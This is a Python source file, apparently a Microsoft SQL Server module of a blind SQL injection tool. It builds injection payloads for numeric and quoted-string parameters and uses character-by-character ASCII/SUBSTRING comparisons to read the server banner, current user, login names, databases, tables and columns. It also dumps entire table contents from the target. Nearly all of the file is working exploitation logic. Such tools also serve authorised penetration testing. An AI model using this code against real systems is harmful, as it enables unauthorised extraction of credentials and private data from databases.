#!/usr/bin/env python


import random
import re
import time

from plugins.attack.db.dbDriver import dbDriver as Common


class MSSQLServerMap(Common):
    __banner                 = ""
    __currentDb              = ""
    __fingerprint            = []
    __cachedDbs              = []
    __cachedTables           = {}
    __cachedColumns          = {}


    def unescape(self, expression):
        while True:
            index = expression.find("'")
            if index == -1:
                break

            firstIndex = index + 1
            index = expression[firstIndex:].find("'")

            if index == -1:
                raise Exception, "Unenclosed ' in '%s'" % expression

            lastIndex = firstIndex + index
            old = "'%s'" % expression[firstIndex:lastIndex]
            unescaped = "("

            for i in range(firstIndex, lastIndex):
                unescaped += "CHAR(%d)" % (ord(expression[i]))
                if i < lastIndex - 1:
                    unescaped += "+"

            unescaped += ")"
            expression = expression.replace(old, unescaped)

        return expression


    def createStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm = " OR ASCII(SUBSTRING((%s), %d, %d)) > %d"
        elif self.args.injectionMethod == "stringsingle":
            evilStm = "' OR ASCII(SUBSTRING((%s), %d, %d)) > %d AND '1'='1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm = '" OR ASCII(SUBSTRING((%s), %d, %d)) > %d AND "1"="1'

        return evilStm

    def createExactStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm = " OR SUBSTRING((%s), %d, %d) = '%s' AND 1=1"
        elif self.args.injectionMethod == "stringsingle":
            evilStm = "' OR SUBSTRING((%s), %d, %d) = '%s' AND '1'='1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm = '" OR SUBSTRING((%s), %d, %d) = \'%s\' AND "1"="1'

        return evilStm

    def getFingerprint(self):
        if not self.args.exaustiveFp:
            return "Microsoft SQL Server"

        actVer = self.parseFp("Microsoft SQL Server", self.__fingerprint)
        value = "active fingerprint: %s" % actVer

        if self.__banner:
            banVer = re.search("Microsoft SQL Server\s+([\d\.]+) - ([\d\.]+)", self.__banner)
            if banVer:
                release = "Microsoft SQL Server %s, version" % banVer.groups()[0]
                banVer = banVer.groups()[1]
                banVer = self.parseFp(release, [banVer])

            blank = " " * 16
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        return value


    def getBanner(self):
        logMsg = "fetching banner"
        self.log(logMsg)

        if not self.__banner:
            self.__banner = self.getValue("@@VERSION")

        return self.__banner


    def getCurrentUser(self):
        logMsg = "fetching current user"
        self.log(logMsg)

        return self.getValue("USER_NAME()")


    def getCurrentDb(self):
        logMsg = "fetching current database"
        self.log(logMsg)

        if self.__currentDb:
            return self.__currentDb
        else:
            return self.getValue("DB_NAME()")


    def getUsers(self):
        logMsg = "fetching number of database users"
        self.log(logMsg)

        stm  = "SELECT STR(COUNT(name)) FROM master..syslogins"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of database users"
            raise Exception, errMsg

        logMsg = "fetching database users"
        self.log(logMsg)

        users = []

        for index in range(int(count)):
            stm  = "SELECT TOP 1 name FROM master..syslogins "
            stm += "WHERE name NOT IN (SELECT TOP %d name " % index
            stm += "FROM master..syslogins ORDER BY name) "
            stm += "ORDER BY name"

            user = self.getValue(stm)
            users.append(user)

        if not users:
            raise Exception, "unable to retrieve the database users"

        return users


    def getDbs(self):
        logMsg = "fetching number of databases"
        self.log(logMsg)

        stm = "SELECT STR(COUNT(name)) FROM master..sysdatabases"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of databases"
            raise Exception, errMsg


        logMsg = "fetching database names"
        self.log(logMsg)

        dbs = []

        for index in range(int(count)):
            stm  = "SELECT TOP 1 name FROM master..sysdatabases "
            stm += "WHERE name NOT IN (SELECT TOP %d name " % index
            stm += "FROM master..sysdatabases ORDER BY name) "
            stm += "ORDER BY name"

            db = self.getValue(stm)
            dbs.append(db)

        if dbs:
            self.__cachedDbs = dbs
        else:
            errMsg = "unable to retrieve the database names"
            raise Exception, errMsg

        return dbs


    def getTables(self):
        if not self.args.db:
            if not len(self.__cachedDbs):
                dbs = self.getDbs()
            else:
                dbs = self.__cachedDbs
        else:
            if "," in self.args.db:
                dbs = self.args.db.split(",")
            else:
                dbs = [self.args.db]

        dbTables = {}

        for db in dbs:
            logMsg = "fetching number of tables for database '%s'" % db
            self.log(logMsg)

            stm  = "SELECT STR(COUNT(table_name)) FROM "
            stm += "%s.information_schema.tables " % db
            stm += "WHERE table_type = 'BASE TABLE'"

            count = self.getValue(stm)

            if not len(count) or count == "0":
                warnMsg  = "unable to retrieve the number of "
                warnMsg += "tables for database '%s'" % db
                self.warn(warnMsg)

                continue

            logMsg = "fetching tables for database '%s'" % db
            self.log(logMsg)

            tables = []

            for index in range(int(count)):
                stm  = "SELECT TOP 1 table_name FROM "
                stm += "%s.information_schema.tables WHERE " % db
                stm += "table_type = 'BASE TABLE' AND table_name "
                stm += "NOT IN (SELECT TOP %d table_name " % index
                stm += "FROM %s.information_schema.tables WHERE " % db
                stm += "table_type = 'BASE TABLE' ORDER BY table_name) "
                stm += "ORDER BY table_name"

                table = self.getValue(stm)
                tables.append(table)

            if tables:
                dbTables[db] = tables
            else:
                warnMsg  = "unable to retrieve the tables "
                warnMsg += "for database '%s'" % db
                self.warn(warnMsg)

        if dbTables:
            self.__cachedTables = dbTables
        elif not self.args.db:
            errMsg  = "unable to retrieve the tables for any database"
            raise Exception, errMsg

        return dbTables


    def getColumns(self):
        if not self.args.tbl:
            errMsg = "missing table parameter"
            raise Exception, errMsg

        if "." in self.args.tbl:
            self.args.db, self.args.tbl = self.args.tbl.split(".")

        if not self.args.db:
            errMsg  = "missing database parameter which is "
            errMsg += "mandatory to get table columns on "
            errMsg += "Microsoft SQL Server module"
            raise Exception, errMsg

        logMsg  = "fetching number of columns for table "
        logMsg += "'%s' on database '%s'" % (self.args.tbl, self.args.db)
        self.log(logMsg)

        stm  = "SELECT STR(COUNT(column_name)) FROM "
        stm += "%s.information_schema.columns, " % self.args.db
        stm += "%s.information_schema.tables " % self.args.db
        stm += "WHERE %s.information_schema" % self.args.db
        stm += ".columns.table_name = '%s' AND " % self.args.tbl
        stm += "%s.information_schema.columns.table_name" % self.args.db
        stm += "= %s.information_schema.tables.table_name " % self.args.db
        stm += "AND %s.information_schema.tables.table_type " % self.args.db
        stm += "= 'BASE TABLE'"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of columns "
            errMsg += "for table '%s' " % self.args.tbl
            errMsg += "on database '%s'" % self.args.db
            raise Exception, errMsg

        logMsg  = "fetching columns for table '%s' " % self.args.tbl
        logMsg += "on database '%s'" % self.args.db
        self.log(logMsg)

        tableColumns = {}
        table = {}
        columns = {}

        for index in range(int(count)):
            stm  = "SELECT TOP 1 column_name FROM "
            stm += "%s.information_schema.columns, " % self.args.db
            stm += "%s.information_schema.tables " % self.args.db
            stm += "WHERE %s.information_schema" % self.args.db
            stm += ".columns.table_name = '%s' AND " % self.args.tbl
            stm += "%s.information_schema.columns.table_name" % self.args.db
            stm += "= %s.information_schema.tables.table_name " % self.args.db
            stm += "AND %s.information_schema.tables.table_type " % self.args.db
            stm += "= 'BASE TABLE' AND column_name NOT IN "
            stm += "(SELECT TOP %d column_name FROM " % index
            stm += "%s.information_schema.columns, " % self.args.db
            stm += "%s.information_schema.tables " % self.args.db
            stm += "WHERE %s.information_schema" % self.args.db
            stm += ".columns.table_name = '%s' AND " % self.args.tbl
            stm += "%s.information_schema.columns.table_name" % self.args.db
            stm += "= %s.information_schema.tables.table_name " % self.args.db
            stm += "AND %s.information_schema.tables.table_type " % self.args.db
            stm += "= 'BASE TABLE' ORDER BY column_name) ORDER BY column_name"

            column = self.getValue(stm)

            stm  = "SELECT data_type FROM "
            stm += "%s.information_schema.columns " % self.args.db
            stm += "WHERE %s.information_schema.columns." % self.args.db
            stm += "column_name = '%s' AND " % column
            stm += "%s.information_schema" % self.args.db
            stm += ".columns.table_name = '%s'" % self.args.tbl

            coltype = self.getValue(stm)
            columns[column] = coltype

        if columns:
            table[self.args.tbl] = columns
            tableColumns[self.args.db] = table
        else:
            errMsg  = "unable to retrieve the columns for "
            errMsg += "table '%s' " % self.args.tbl
            errMsg += "on database '%s'" % self.args.db
            raise Exception, errMsg

        self.__cachedColumns[self.args.db] = table

        return tableColumns


    def dumpTable(self):
        if not self.args.tbl:
            errMsg = "missing table parameter"
            raise Exception, errMsg

        if "." in self.args.tbl:
            self.args.db, self.args.tbl = self.args.tbl.split(".")

        if not self.args.db:
            errMsg  = "missing database parameter which is "
            errMsg += "mandatory to get table columns on "
            errMsg += "Microsoft SQL Server module"
            raise Exception, errMsg

        if not self.__cachedColumns:
            self.__cachedColumns = self.getColumns()

        logMsg  = "fetching number of entries for table "
        logMsg += "'%s' on database '%s'" % (self.args.tbl, self.args.db)
        self.log(logMsg)

        fromExpr = "%s..%s" % (self.args.db, self.args.tbl)
        columnValues = {}
        stm = "SELECT STR(COUNT(*)) FROM %s" % fromExpr

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of entries "
            errMsg += "for table '%s' " % self.args.tbl
            errMsg += "on database '%s'" % self.args.db
            raise Exception, errMsg

        if self.args.col:
            self.args.col = self.args.col.split(',')

        columns = self.__cachedColumns[self.args.db][self.args.tbl]

        for column in columns.keys():
            if self.args.col and column not in self.args.col:
                continue

            logMsg  = "fetching entries of column '%s' for " % column
            logMsg += "table '%s' " % self.args.tbl
            logMsg += "on database '%s'" % self.args.db
            self.log(logMsg)

            length = 0
            values = []
            columnData = {}
            columnValues[column] = {}

            for index in range(int(count)):
                stm  = "SELECT TOP 1 %s FROM %s " % (column, fromExpr)
                stm += "WHERE %s NOT IN (SELECT TOP %d " % (column, index)
                stm += "%s FROM %s)" % (column, fromExpr)
                value = self.getValue(stm)

                length = max(length, len(str(value)))
                values.append(value)

            if length < len(column):
                columnData["length"] = len(column)
            else:
                columnData["length"] = length

            columnData["values"] = values
            columnValues[column] = columnData

        if columnValues:
            infos = {}

            if self.args.db:
                infos["db"] = self.args.db
            else:
                infos["db"] = None
            infos["table"] = self.args.tbl
            infos["count"] = count

            columnValues["__infos__"] = infos
        else:
            errMsg  = "unable to retrieve the entries for "
            errMsg += "table '%s' " % self.args.tbl
            errMsg += "on database '%s'" % self.args.db
            raise Exception, errMsg

        return columnValues


    def getFile(self, filename):
        errMsg  = "Microsoft SQL Server module does "
        errMsg += "not support file reading"
        raise Exception, errMsg


    def getExpr(self, expression):
        if self.args.unionUse:
            return self.unionUse(expression)
        else:
            return self.getValue(expression)


    def checkDbms(self):
        logMsg = "testing Microsoft SQL Server"
        self.log(logMsg)

        randInt = str(random.randint(1, 9))
        stm = "STR(LEN(%s))" % randInt

        if re.search("\s*1$", self.getValue(stm)):
            if not self.args.exaustiveFp:
                return True

            self.__fingerprint = []

            if self.args.getBanner:
                self.__banner = self.getValue("@@VERSION")

            return True
        else:
            warnMsg = "remote database is not Microsoft SQL Server"
            self.warn(warnMsg)

            return False


    def __init__(self, urlOpener, cmpFunction, vuln):
        Common.__init__( self, urlOpener, cmpFunction, vuln )

